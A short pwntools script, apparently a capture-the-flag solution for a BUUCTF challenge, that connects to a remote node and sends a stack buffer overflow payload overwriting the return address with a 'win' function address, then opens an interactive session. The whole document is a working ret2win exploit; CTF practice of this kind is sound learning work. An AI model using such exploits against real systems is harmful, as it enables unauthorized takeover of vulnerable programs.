from pwn import *
 
r = remote('node5.buuoj.cn',28899)
win_addr = 0x080485cb

payload = b'b' * (0x28+0x4) + p32(win_addr)
r.sendline(payload)

r.interactive()

